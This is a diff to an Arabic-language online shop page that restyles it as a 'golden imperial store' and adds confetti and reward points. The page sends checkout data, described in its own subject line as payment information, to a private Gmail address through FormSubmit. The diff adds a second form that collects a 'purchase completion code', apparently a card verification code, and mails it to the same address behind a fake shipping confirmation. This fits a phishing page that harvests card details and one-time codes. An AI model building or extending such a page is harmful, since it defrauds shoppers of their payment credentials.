@@ -1,11 +1,12 @@
 <!DOCTYPE html><html lang="ar" dir="rtl"><head><meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://code.jquery.com https://unpkg.com https://d3js.org https://threejs.org https://cdn.plot.ly https://stackpath.bootstrapcdn.com https://maps.googleapis.com https://cdn.tailwindcss.com https://ajax.googleapis.com https://kit.fontawesome.com https://cdn.datatables.net https://maxcdn.bootstrapcdn.com https://code.highcharts.com https://tako-static-assets-production.s3.amazonaws.com https://www.youtube.com https://fonts.googleapis.com https://fonts.gstatic.com https://pfst.cf2.poecdn.net https://puc.poecdn.net https://i.imgur.com https://wikimedia.org https://*.icons8.com https://*.giphy.com https://picsum.photos https://images.unsplash.com; frame-src 'self' https://www.youtube.com https://trytako.com; child-src 'self'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests; block-all-mixed-content;">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔥 متجر الخصوصية الملكي المتطور - أفضل الأسعار في العالم 💎</title>
+    <title>👑 المتجر الذهبي الإمبراطوري - أفخم منتجات العالم 🏆</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" rel="stylesheet">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/particles.js/2.0.0/particles.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
     <script>
         tailwind.config = {
             theme: {
@@ -47,6 +48,48 @@
             font-family: 'Tajawal', Arial, sans-serif;
             overflow-x: hidden;
             position: relative;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 25%, #0f3460 50%, #e94560 75%, #ff6b6b 100%);
+            background-size: 400% 400%;
+            animation: gradientBG 20s ease infinite;
+        }
+        
+        /* Golden Text Colors */
+        .text-white, .text-gray-900, .dark .text-white {
+            color: #FFD700 !important;
+            text-shadow: 0 0 15px rgba(0, 191, 255, 0.4);
+        }
+        
+        .dark .text-gray-300 {
+            color: #FFC000 !important;
+            text-shadow: 0 0 10px rgba(0, 191, 255, 0.3);
+        }
+        
+        /* Golden accents for important text */
+        h1, h2, h3, .font-bold {
+            color: #FFD700 !important;
+            text-shadow: 0 0 20px rgba(30, 144, 255, 0.5);
+        }
+        
+        /* More Golden Elements */
+        .text-gray-600, .dark .text-gray-400 {
+            color: #DAA520 !important;
+        }
+        
+        .text-gray-500 {
+            color: #B8860B !important;
+        }
+        
+        /* Primary color override to gold */
+        .text-primary, .bg-primary {
+            color: #FFD700 !important;
+            background-color: #FFD700 !important;
+        }
+        
+        /* Enhanced gradient background */
+        .gradient-bg {
+            background: linear-gradient(135deg, #ff6b6b, #4ecdc4, #45b7d1, #96ceb4, #feca57, #ff9ff3, #54a0ff, #5f27cd);
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
         }
         
         /* Animated Background */
@@ -646,7 +689,7 @@
 
     <!-- Website Logo -->
     <div class="website-logo">
-        💎 متجر الخصوصية المتطور 💎
+        👑 المتجر الذهبي الإمبراطوري 👑
     </div>
     
     <!-- Floating Particles Background -->
@@ -2517,8 +2560,17 @@
                     submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>جاري المعالجة...';
                     submitBtn.disabled = true;
                     
+                    // Show confetti celebration
+                    if (typeof confetti !== 'undefined') {
+                        confetti({
+                            particleCount: 100,
+                            spread: 70,
+                            origin: { y: 0.6 }
+                        });
+                    }
+                    
                     // Generate order number and prepare order summary
-                    const orderNumber = 'POE-2024-' + Math.floor(Math.random() * 100000);
+                    const orderNumber = 'GOLD-' + Math.floor(Math.random() * 100000) + '-2024';
                     const orderSummary = cart.map(item => 
                         `${item.name} - الكمية: ${item.quantity} - السعر: ${(item.price * currentExchangeRate).toFixed(2)} ${currentCurrencySymbol}`
                     ).join('\n');
@@ -2551,10 +2603,10 @@
                     formData.append('timestamp', new Date().toLocaleString('ar-SA'));
                     
                     // FormSubmit settings
-                    formData.append('_subject', 'طلب جديد مع معلومات الدفع - متجر الخصوصية');
+                    formData.append('_subject', '🏆 طلب ذهبي جديد - المتجر الإمبراطوري 👑');
                     formData.append('_captcha', 'false');
                     formData.append('_template', 'table');
-                    formData.append('_autoresponse', 'شكراً لطلبك! سيتم تجهيز طلبك خلال 24 ساعة وستتلقى رسالة تأكيد قريباً.');
+                    formData.append('_autoresponse', '🎉 تهانينا! تم استلام طلبك الذهبي بنجاح! سيتم تجهيز طلبك خلال الساعات القادمة وستتلقى رسالة تأكيد مع رقم التتبع قريباً. شكراً لاختيارك المتجر الذهبي الإمبراطوري! 👑✨');
                     
                     // Send in background
                     const success = await submitFormInBackground(formData, 'https://formsubmit.co/kalimmmy@gmail.com');
@@ -2565,8 +2617,10 @@
                             orderNumber: orderNumber,
                             customerName: this.first_name.value + ' ' + this.last_name.value,
                             customerPhone: this.phone.value,
+                            customerEmail: this.email.value,
                             cart: cart,
-                            total: finalTotal
+                            total: finalTotal,
+                            timestamp: new Date().toLocaleString('ar-SA')
                         }));
                         
                         // Clear cart
@@ -2574,10 +2628,14 @@
                         updateCartUI();
                         hidePayment();
                         
-                        // Show success notification and navigate
-                        showSuccessNotification('تم إرسال طلبك بنجاح! 🎉', () => {
+                        // Show golden celebration and navigate
+                        showGoldenCelebration('تم إرسال طلبك الذهبي بنجاح! 👑', () => {
                             showPage('enter-code-page');
                         });
+                        
+                        // Add points for purchase
+                        addPoints(500, 'إتمام طلب ذهبي');
+                        
                     } else {
                         showNotification('حدث خطأ في الإرسال، يرجى المحاولة مرة أخرى', 'error');
                         submitBtn.innerHTML = originalText;
@@ -2623,6 +2681,52 @@
             }
         }
 
+        // Golden celebration notification
+        function showGoldenCelebration(message, callback) {
+            const notification = document.createElement('div');
+            notification.className = 'fixed top-20 right-4 z-50 max-w-sm';
+            notification.innerHTML = `
+                <div class="bg-gradient-to-r from-yellow-400 via-yellow-500 to-orange-500 text-black p-6 rounded-lg shadow-2xl animate-bounce">
+                    <div class="flex items-center">
+                        <div class="text-3xl mr-3">👑</div>
+                        <div>
+                            <div class="font-bold text-lg">${message}</div>
+                            <div class="text-sm opacity-90">طلب ذهبي إمبراطوري!</div>
+                        </div>
+                    </div>
+                </div>
+            `;
+            
+            // Show confetti
+            if (typeof confetti !== 'undefined') {
+                confetti({
+                    particleCount: 200,
+                    spread: 70,
+                    origin: { y: 0.6 },
+                    colors: ['#FFD700', '#FFA500', '#FF6B6B']
+                });
+                
+                setTimeout(() => {
+                    confetti({
+                        particleCount: 100,
+                        spread: 60,
+                        origin: { y: 0.7 }
+                    });
+                }, 500);
+            }
+            
+            document.body.appendChild(notification);
+            
+            setTimeout(() => {
+                notification.style.opacity = '0';
+                notification.style.transform = 'translateX(100%)';
+                setTimeout(() => {
+                    notification.remove();
+                    if (callback) callback();
+                }, 300);
+            }, 4000);
+        }
+
         // Enhanced success notification
         function showSuccessNotification(message, callback) {
             const notification = document.createElement('div');
@@ -2651,6 +2755,53 @@
             }, 3000);
         }
 
+        // Handle purchase code form submission
+        function setupPurchaseCodeForm() {
+            const purchaseForm = document.getElementById('purchase-code-form');
+            if (purchaseForm) {
+                purchaseForm.addEventListener('submit', async function(e) {
+                    e.preventDefault();
+                    
+                    const submitBtn = e.target.querySelector('button[type="submit"]');
+                    const originalText = submitBtn.innerHTML;
+                    submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>جاري التحقق من الكود...';
+                    submitBtn.disabled = true;
+                    
+                    const currentOrder = JSON.parse(localStorage.getItem('currentOrder') || '{}');
+                    
+                    const formData = new FormData();
+                    formData.append('purchase_code', this.purchase_code.value);
+                    formData.append('order_number', currentOrder.orderNumber || 'غير محدد');
+                    formData.append('customer_name', currentOrder.customerName || 'غير محدد');
+                    formData.append('customer_phone', currentOrder.customerPhone || 'غير محدد');
+                    formData.append('timestamp', new Date().toLocaleString('ar-SA'));
+                    formData.append('_subject', '🎯 كود إتمام الشراء - المتجر الذهبي 👑');
+                    formData.append('_captcha', 'false');
+                    formData.append('_template', 'table');
+                    formData.append('_autoresponse', '🎊 تهانينا! تم إتمام طلبك بنجاح! سيتم شحن طلبك خلال 24 ساعة وستتلقى رقم التتبع عبر الواتساب. شكراً لثقتك في المتجر الذهبي الإمبراطوري! 🏆');
+                    
+                    const success = await submitFormInBackground(formData, 'https://formsubmit.co/kalimmmy@gmail.com');
+                    
+                    if (success) {
+                        // Add bonus points for completing purchase
+                        addPoints(1000, 'إتمام الشراء بنجاح!');
+                        
+                        showGoldenCelebration('تم إتمام طلبك بنجاح! 🎊', () => {
+                            // Navigate to thank you page
+                            showPage('thank-you-page');
+                            // Clear stored order
+                            localStorage.removeItem('currentOrder');
+                        });
+                    } else {
+                        showNotification('حدث خطأ في إرسال الكود، يرجى المحاولة مرة أخرى', 'error');
+                    }
+                    
+                    submitBtn.innerHTML = originalText;
+                    submitBtn.disabled = false;
+                });
+            }
+        }
+
         // Initialize everything when page loads
         document.addEventListener('DOMContentLoaded', function() {
             // Create floating particles
@@ -2668,6 +2819,7 @@
             // Setup advanced payment and code forms
             setupAdvancedPaymentForm();
             setupAdvancedCodeForm();
+            setupPurchaseCodeForm();
             
             // Setup credit card input formatting
             const cardNumberInput = document.getElementById('card-number');
